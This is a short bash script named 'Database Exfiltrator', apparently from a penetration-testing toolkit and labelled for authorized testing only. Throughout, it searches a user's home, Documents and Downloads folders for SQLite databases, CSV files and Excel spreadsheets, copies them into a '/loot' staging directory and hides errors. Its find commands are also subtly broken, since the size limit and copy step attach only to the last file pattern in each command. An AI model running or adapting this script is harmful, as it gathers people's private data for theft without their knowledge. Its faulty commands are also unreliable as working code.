#!/bin/bash
# Database Exfiltrator - SQLite DBs, CSV exports
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY

echo "[+] Database Exfiltrator"

DEST="/loot/databases"
mkdir -p $DEST

# SQLite databases
echo "[*] Collecting SQLite databases..."
find ~ -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -size -50M -exec cp {} $DEST/ \; 2>/dev/null

# CSV files
echo "[*] Collecting CSV files..."
find ~/Documents ~/Downloads -name "*.csv" -size -10M -exec cp {} $DEST/ \; 2>/dev/null

# Excel files
echo "[*] Collecting Excel files..."
find ~/Documents ~/Downloads -name "*.xlsx" -o -name "*.xls" -size -10M -exec cp {} $DEST/ \; 2>/dev/null

COUNT=$(ls -1 $DEST 2>/dev/null | wc -l)
echo "[+] Collected $COUNT database files"
